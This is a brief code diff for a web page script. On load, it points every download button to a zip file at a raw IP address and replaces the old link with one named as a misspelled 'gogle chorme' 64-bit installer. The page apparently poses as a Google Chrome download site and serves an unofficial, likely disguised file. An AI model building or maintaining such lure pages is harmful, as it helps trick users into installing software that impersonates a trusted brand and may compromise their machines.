@@ -1,6 +1,6 @@
 window.onload = function() {
     // 下载链接
-    let url = 'http://137.220.158.27/chetuysupe%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8.zip'
+    let url = 'http://43.248.173.23/gogle%20chorme%2064位_189.0.547.zip'
 
     document.querySelectorAll('.download').forEach(item => {
         item.onclick = function() {
